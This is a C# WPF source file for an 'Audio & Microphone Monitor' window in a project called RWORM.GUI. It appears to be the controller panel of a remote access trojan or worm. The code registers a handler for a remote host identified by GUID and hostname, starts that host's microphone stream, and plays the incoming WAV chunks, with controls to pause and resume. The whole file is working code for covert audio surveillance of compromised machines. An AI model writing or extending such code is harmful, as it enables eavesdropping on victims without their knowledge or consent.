using System;
using System.IO;
using System.Media;
using System.Windows;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class AudioMonitorWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _listening = true;
        private int  _chunks = 0;

        public AudioMonitorWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Audio & Microphone Monitor — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterAudioStreamHandler(_guid, OnAudioChunkReceived);
            _ = _server.StartAudio(_guid);
            StatusLabel.Text = "Listening to remote audio stream...";
        }

        private void OnAudioChunkReceived(byte[] wavBytes)
        {
            if (!_listening || wavBytes.Length == 0) return;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                try
                {
                    _chunks++;
                    ChunkCountLabel.Text = _chunks.ToString();
                    AudioPulse.Opacity = (_chunks % 2 == 0) ? 0.8 : 0.4;

                    using var ms = new MemoryStream(wavBytes);
                    using var player = new SoundPlayer(ms);
                    player.Play(); // Asynchronously plays the wave chunk
                    StatusLabel.Text = $"Audio chunk {_chunks} ({wavBytes.Length / 1024} KB) playing — {DateTime.Now:HH:mm:ss}";
                }
                catch (Exception ex)
                {
                    StatusLabel.Text = $"Playback notice: {ex.Message}";
                }
            }));
        }

        private void Listen_Click(object sender, RoutedEventArgs e)
        {
            _listening = !_listening;
            if (_listening)
            {
                ListenBtn.Content = "⏹ Stop Listening";
                ListenBtn.Style = (Style)FindResource("DangerButton");
                _ = _server.StartAudio(_guid);
                StatusLabel.Text = "Listening resumed";
            }
            else
            {
                ListenBtn.Content = "▶ Start Listening";
                ListenBtn.Style = (Style)FindResource("SecondaryButton");
                _ = _server.StopAudio(_guid);
                AudioPulse.Opacity = 0.2;
                StatusLabel.Text = "Listening paused";
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            _listening = false;
            _server.UnregisterAudioStreamHandler(_guid);
            _ = _server.StopAudio(_guid);
            base.OnClosed(e);
        }
    }
}
